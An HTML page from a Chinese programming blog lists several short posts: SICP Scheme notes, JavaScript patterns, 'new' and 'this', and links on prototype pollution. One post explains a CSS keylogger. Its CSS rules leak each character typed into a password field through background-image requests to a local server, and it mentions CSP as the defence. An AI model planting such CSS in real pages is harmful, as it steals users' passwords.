<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
<title>
    O
</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">



        
            <meta name="description" content="">
            

                

                        

                                    

                                            

                                                    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
                                                    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">

                                                    
                                                        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
                                                        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
                                                        

                                                            <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">

                                                            
<link rel="stylesheet" href="/o/css/style.css">


                                                                <script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>

                                                                
                                                                    
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-152053462-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-152053462-1');
</script>


                                                                            
                                                                                
<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
<body>
    
<!-- hexo-inject:begin --><!-- hexo-inject:end --><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/o/">
                
                <img src="/o/images/logo.png" alt="" height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/o/archives">归档</a>
            
            <a class="navbar-item "
               href="/o/about">关于</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="搜索" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/EPSON-LEE" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2020/01/01/SICP-1/" itemprop="url">SICP-1</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2020-01-01T12:34:38.000Z" itemprop="datePublished">1月 1 2020</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            4 分钟 读完 (约 561 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="Lisp-语言具有的特性之一"><a href="#Lisp-语言具有的特性之一" class="headerlink" title="Lisp 语言具有的特性之一"></a>Lisp 语言具有的特性之一</h2><p>计算过程的 Lisp 描述 （又称为过程） 本身又可以作为 Lisp 的数据来表示和操作。</p>
<h2 id="程序设计语言的基本元素"><a href="#程序设计语言的基本元素" class="headerlink" title="程序设计语言的基本元素"></a>程序设计语言的基本元素</h2><ol>
<li><p>基本表达形式， 用于表示语言所关心的最简单个体</p>
</li>
<li><p>组合的方法，通过它们可以从比较简单的东西发出</p>
</li>
<li><p>抽象的方法 复合过程</p>
</li>
</ol>
<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><p>Lisp 中使用的是前缀表达书</p>
<h3 id="命名和环境"><a href="#命名和环境" class="headerlink" title="命名和环境"></a>命名和环境</h3><p>变量：通过名字去使用变量的方式</p>
<p><figure class="highlight lisp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( <span class="hljs-name">define</span> size <span class="hljs-number">2</span> )</span><br></pre></td></tr></table></figure></p>
<p>环境：我们一般将值与符号进行关联，然后再去使用这个变量。这就意味着解释器必须维护某种存储的能力，以便保持有关名字的 「名字-值」的对偶的轨迹，这种存储叫做环境。在一个计算过程中会包许多个不同的环境。</p>
<h3 id="复合过程"><a href="#复合过程" class="headerlink" title="复合过程"></a>复合过程</h3><ul>
<li>数和算术运算是基本的数据和过程</li>
<li>组合式的嵌套提供了一种组织多个操作的方法</li>
<li>定义是一种受限的抽象手段，它为名字相应的值</li>
</ul>
<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  define square (x)</span><br><span class="line">    (* x x)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>应用序和正则序</p>
<p>正则序：完全展开后而归约。<br>应用序列： 解释器中的，先求值参数而后应用的方式。</p>
<h2 id="条件表达式和谓词"><a href="#条件表达式和谓词" class="headerlink" title="条件表达式和谓词"></a>条件表达式和谓词</h2><p>(<br>  define (abs x)<br>    (cond ((x &gt; 0) x)<br>          ((x = 0) 0)<br>          ((x &lt; -) (-x))<br>    )<br>)</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="练习-1-2"><a href="#练习-1-2" class="headerlink" title="练习 1.2"></a>练习 1.2</h3><p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name"><span class="hljs-builtin-name">/</span></span> </span><br><span class="line">  (<span class="hljs-name"><span class="hljs-builtin-name">+</span></span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> (<span class="hljs-name"><span class="hljs-builtin-name">-</span></span> <span class="hljs-number">2</span> ( - <span class="hljs-number">3</span> ( + <span class="hljs-number">6</span> (<span class="hljs-name"><span class="hljs-builtin-name">/</span></span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>) ))))</span><br><span class="line">  (<span class="hljs-name"><span class="hljs-builtin-name">*</span></span> <span class="hljs-number">3</span> (<span class="hljs-name"><span class="hljs-builtin-name">-</span></span> <span class="hljs-number">6</span> <span class="hljs-number">2</span>) (<span class="hljs-name"><span class="hljs-builtin-name">-</span></span> <span class="hljs-number">2</span> <span class="hljs-number">7</span>))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h3 id="练习-1-3"><a href="#练习-1-3" class="headerlink" title="练习 1.3"></a>练习 1.3</h3><p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  define (<span class="hljs-name"><span class="hljs-builtin-name">max</span></span> a b)</span><br><span class="line">    (</span><br><span class="line">      cond ((<span class="hljs-name">a</span> &gt; b) a)</span><br><span class="line">            ((<span class="hljs-name">a</span> = b) a)</span><br><span class="line">            ((<span class="hljs-name">a</span> &lt; b) b)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h3 id="练习-1-5"><a href="#练习-1-5" class="headerlink" title="练习 1.5"></a>练习 1.5</h3><h3 id="牛顿法求平方根"><a href="#牛顿法求平方根" class="headerlink" title="牛顿法求平方根"></a>牛顿法求平方根</h3><h2 id="练习-1-6"><a href="#练习-1-6" class="headerlink" title="练习 1.6"></a>练习 1.6</h2><h2 id="练习-1-7"><a href="#练习-1-7" class="headerlink" title="练习 1.7"></a>练习 1.7</h2><h2 id="练习-1-8"><a href="#练习-1-8" class="headerlink" title="练习 1.8"></a>练习 1.8</h2><p>scheme 使用前缀表达式来写</p>
<p>When $a \ne 0$, there are two solutions to \(ax^2 + bx + c = 0\) and they are<br>$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$</p>
<p>使用 scheme 写一个递归</p>
<p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name"><span class="hljs-builtin-name">define</span></span> (<span class="hljs-name">fact</span> n)</span><br><span class="line">  (<span class="hljs-name"><span class="hljs-builtin-name">if</span></span> (<span class="hljs-name"><span class="hljs-builtin-name">=</span></span> n <span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-number">1</span></span><br><span class="line">    (<span class="hljs-name"><span class="hljs-builtin-name">*</span></span> n (<span class="hljs-name">fact</span> (<span class="hljs-name"><span class="hljs-builtin-name">-</span></span> n <span class="hljs-number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line">(<span class="hljs-name">fact</span> <span class="hljs-number">3</span>)</span><br></pre></td></tr></table></figure></p>
<p>scheme 中的 cond<br><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name"><span class="hljs-builtin-name">define</span></span> (<span class="hljs-name">testCond</span> x)</span><br><span class="line">  (<span class="hljs-name"><span class="hljs-builtin-name">cond</span></span></span><br><span class="line">    ((<span class="hljs-name"><span class="hljs-builtin-name">&lt;=</span></span> x <span class="hljs-number">0</span>) (<span class="hljs-name"><span class="hljs-builtin-name">-</span></span> <span class="hljs-number">0</span> x))</span><br><span class="line">    ((<span class="hljs-name"><span class="hljs-builtin-name">&gt;</span></span> x <span class="hljs-number">1</span>) x)</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>scheme 中定义函数的两种形式</p>
<p>第一种</p>
<p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name"><span class="hljs-builtin-name">define</span></span> Hello</span><br><span class="line">  (</span><br><span class="line">    lambda (<span class="hljs-name">a</span> b c)</span><br><span class="line">      (<span class="hljs-name"><span class="hljs-builtin-name">+</span></span> a b c)</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">(<span class="hljs-name">Hello</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>)</span><br></pre></td></tr></table></figure></p>
<p>第二种</p>
<p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  define </span><br><span class="line">    ( Hello a b c)</span><br><span class="line">      (<span class="hljs-name"><span class="hljs-builtin-name">+</span></span> a b c)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>参考</p>
<ul>
<li><p><a href="https://www.zhihu.com/question/28698429" target="_blank" rel="noopener">如何理解计算机中的谓词 Predicate</a></p>
</li>
<li><p><a href="https://repl.it/repls/DistinctOnlyOrganization" target="_blank" rel="noopener">因为比较懒所以没有在本地搭建开发环境,直接使用的是 repl.it 这样一个 web scheme enviroment </a></p>
</li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/31/designpattern/" itemprop="url">设计模式</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-31T16:00:00.000Z" itemprop="datePublished">12月 31 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            1 分钟 读完 (约 167 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>/**</p>
<ul>
<li>AMD 规范 Requirejs</li>
<li>/<br>// <a href="https://juejin.cn/post/6844903759009595405" target="_blank" rel="noopener">https://juejin.cn/post/6844903759009595405</a><br>// 模块十日谈 <a href="http://huangxuan.me/js-module-7day/#/8" target="_blank" rel="noopener">http://huangxuan.me/js-module-7day/#/8</a></li>
</ul>
<p>// IOC 控制反转 Inversion of control</p>
<p>class RTeam {<br>  constructor(props) {<br>    super(props)<br>    this.name = ‘Rocket’<br>  }</p>
<p>}</p>
<p>class Player {</p>
<p>  constructor(props) {<br>    super(props);<br>    this.team = new Team()<br>  }</p>
<p>  info() {<br>    console.log(this.team.name)<br>  }<br>}</p>
<p>let ym = new Player()<br>ym.info()</p>
<p>// RequireJS/AMD 的模块加载器</p>
<p>var injector = {</p>
<p>}</p>
<p>// 责任链模式</p>
<p>// 链式调用</p>
<p>const A = function(value) {<br>  this.value = value<br>}</p>
<p>A.prototype.add = function(val) {<br>  this.value += val<br>  return this<br>}</p>
<p>A.prototype.sub = function(val) {<br>  this.value -= val<br>  return this<br>}</p>
<p>A.prototype.multiply = function(val) {<br>  this.value *= val<br>  return this<br>}</p>
<p>A.prototype.divide = function(val) {<br>  this.value /= val<br>  return this<br>}</p>
<p>var calculator = new A(1)<br>// (1 + 2 - 3) * 5<br>calculator.add(2).sub(3).multiply(5)</p>
<p>class Tools {</p>
<p>  constructor(val) {<br>    this.value = val<br>  }</p>
<p>  add(val) {<br>    this.value += val<br>    return this<br>  }</p>
<p>  sub(val) {<br>    this.value -= val<br>    return this<br>  }</p>
<p>  multiply(val) {<br>    this.value *= val<br>    return this<br>  }<br>}</p>
<p>var num = new Tools(2)<br>num.add(2).sub(1)</p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/28/javascript-new/" itemprop="url">实现 JavaScript 中的 new 关键字</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-28T17:23:40.000Z" itemprop="datePublished">12月 28 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            1 分钟 读完 (约 204 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>众所周知 JavaScript 是一门基于原型、函数先行的多范式语言，它已经由ECMA（欧洲电脑制造商协会）通过ECMAScript实现语言的标准化。</p>
<p>想要知道如何实现 new 关键字我们就得搞清楚 new 做了什么。</p>
<h2 id="JavaScript-中的-new-做了什么"><a href="#JavaScript-中的-new-做了什么" class="headerlink" title="JavaScript 中的 new 做了什么 ?"></a>JavaScript 中的 new 做了什么 ?</h2><p>按照 <a href="https://es5.github.io/#x13.2.2" target="_blank" rel="noopener">spec</a> ,new 依次做了以下 4 件事情：</p>
<ol>
<li>创建一个对象 new Object</li>
<li>链接该对象（即设置该对象的构造函数）到另一个对象 ；</li>
<li>将步骤 1 新创建的对象作为 this 的上下文；</li>
<li>如果构造函数没有返回对象则返回 this</li>
</ol>
<p>最终实现代码</p>
<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function objFactory() &#123;</span><br><span class="line">  var Constructor &#x3D; [].shift.call(arguments)</span><br><span class="line">  var obj &#x3D; Object.create(Constructor.prototype)</span><br><span class="line">  var ret &#x3D; Constructor.apply(obj, arguments)</span><br><span class="line">  return (typeof ret instanceof Object || ret &#x3D;&#x3D;&#x3D; null) ? ret : obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/26/javascript-extends/" itemprop="url">javascript-extends</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-26T03:23:44.000Z" itemprop="datePublished">12月 26 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 10 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20191226112232.png" alt></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/26/JavaScript-Excution/" itemprop="url">How does the “this” keyword work?</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-26T02:23:19.000Z" itemprop="datePublished">12月 26 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            1 分钟 读完 (约 133 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>最近在 stackoverflow 看到了一个问题: this 是如何工作的。要想解释这个问题，需要对 JavaScript Exuction 和 JavaScript Scope 有足够的了解。</p>
<p>按照 JavaScript Specification</p>
<ol>
<li><p>Initial global execution context</p>
</li>
<li><p>Entering eval code</p>
</li>
<li><p>Entering function code </p>
</li>
<li><p>Arrow function</p>
</li>
</ol>
<blockquote>
<p>Arrow functions don’t have their own this…. binding. Instead, those identifiers are  resolved in the lexical scope like any other variable. That means that inside an arrow function, this…refer(s) to the values of this in the environment the arrow function is defined in.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20191226112232.png" alt></p>
<p><a href="https://stackoverflow.com/questions/3127429/how-does-the-this-keyword-work/3127440#3127440" target="_blank" rel="noopener">How does the “this” keyword work?</a></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JS-module/" itemprop="url">JS 模块加载器原理</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T10:08:12.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 23 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考</p>
<ul>
<li><a href="https://www.zhihu.com/question/21157540" target="_blank" rel="noopener">JS模块加载器加载原理是怎么样的？</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JavaScript-chain/" itemprop="url">JavaScript 原型链机制</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T09:12:22.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 13 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="Flag-使用-canvas-技术将其可视化出来"><a href="#Flag-使用-canvas-技术将其可视化出来" class="headerlink" title="Flag: 使用 canvas 技术将其可视化出来"></a>Flag: 使用 canvas 技术将其可视化出来</h2>
    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JavaScript-pollution/" itemprop="url">JavaScript 中的原型污染攻击</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T09:07:30.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 74 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考：</p>
<ul>
<li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></li>
<li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank" rel="noopener">prototype-pollution-nsec18</a></li>
<li><a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">JavaScript 原型链污染</a></li>
<li><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">从一道 CTF 题看 Node.js 的 prototype pollution attack</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/13/keylogger/" itemprop="url">使用css selector 记录用户输入信息</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-13T06:09:22.000Z" itemprop="datePublished">12月 13 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            3 分钟 读完 (约 462 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="CSS3-Selector"><a href="#CSS3-Selector" class="headerlink" title="CSS3 Selector"></a>CSS3 Selector</h2><p>  实现使用 CSS 记录用户信息主要使用了 CSS3 中的 selector。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">选择器</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">E[attr^=”val”]</td>
<td align="left">属性 attr 的值以 “val” 开头的元素</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">E[att$=”val”]</td>
<td align="left">属性 attr 的值以 “val” 结尾的元素</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">E[att*=”val”]</td>
<td align="left">属性 attr 的值以 “val” 字符串的元素</td>
</tr>
</tbody></table>
<h2 id="键位匹配"><a href="#键位匹配" class="headerlink" title="键位匹配"></a>键位匹配</h2><p>浏览器自身默认不会将用户输入的值同步到 value 中, 但像一些框架会将用户输入值同步到 value 中。<a href="https://codepen.io/epson-lee/pen/vYYzaNb?editors=0010" target="_blank" rel="noopener">Demo Link</a></p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger.gif" alt="demo.gif"></p>
<p>将值同步到 value 之后，我们可以使用 css 来做匹配，对应的键位发送到不同的链接。</p>
<p><figure class="highlight css hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* 命中 0 时 请求对应的接口 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"password"</span>]</span><span class="hljs-selector-attr">[value$=<span class="hljs-string">"0"</span>]</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"http://localhost:3000/0"</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-comment">/* 命中 1 时 请求对应的接口 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"password"</span>]</span><span class="hljs-selector-attr">[value$=<span class="hljs-string">"1"</span>]</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"http://localhost:3000/1"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>在知道可以使用 css 来记录按键之后我兴冲冲的找到对应的 github demo，按照文档所说打开 <a href="https://instagram.com" target="_blank" rel="noopener">https://instagram.com</a>，安装 Chrome Extension、输入密码但却然而却发现并没有记录到信息，出现了如下的错误信息：</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger-error.png" alt="Error Info"></p>
<p>在 antd-design-pro 示例登录页倒是可以。</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/1.gif" alt="antd-design-pro 示例登录页"></p>
<p>这是因为 <a href="https://instagram.com" target="_blank" rel="noopener">https://instagram.com</a> 使用了 CSP (Content Security Policy)。 说白了就是为了页面安全而制定的一系列防护措施，通过CSP所约束的规则制定可信的内容来源（脚本、图片、iframe、fton、style 等可能的远程资源）。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS Keylogger</a><br><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击</a></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/11/binary/" itemprop="url">使用 JavaScript 进行二进制计算</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-11T13:15:13.000Z" itemprop="datePublished">12月 11 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 28 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight" target="_blank" rel="noopener">reduecRight 的 Polyfill</a></p>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">Object</span>(<span class="hljs-keyword">this</span>), len = t.length &gt;&gt;&gt; <span class="hljs-number">0</span>, k = len - <span class="hljs-number">1</span>, value;</span><br></pre></td></tr></table></figure></p>

    
    </div>
    
    
</article>




    
    
        
<nav class="pagination is-centered is-rounded" role="navigation" aria-label="pagination">
    <div class="pagination-previous">
        <a href="/o/page/2/">上一页</a>
    </div>
    <div class="pagination-next">
        <a href="/o/page/4/">下一页</a>
    </div>
    <ul class="pagination-list is-hidden-mobile">
        
        <li><a class="pagination-link" href="/o/">1</a></li>
        
        <li><a class="pagination-link" href="/o/page/2/">2</a></li>
        
        <li><a class="pagination-link is-current" href="/o/page/3/">3</a></li>
        
        <li><a class="pagination-link" href="/o/page/4/">4</a></li>
        
        <li><a class="pagination-link" href="/o/page/5/">5</a></li>
        
    </ul>
</nav>
    
    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2021 leejiahao&nbsp;
                我所做的一切，不过是在取悦一个影子 </a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/EPSON-LEE" target="_blank" rel="noopener">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("zh-CN");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
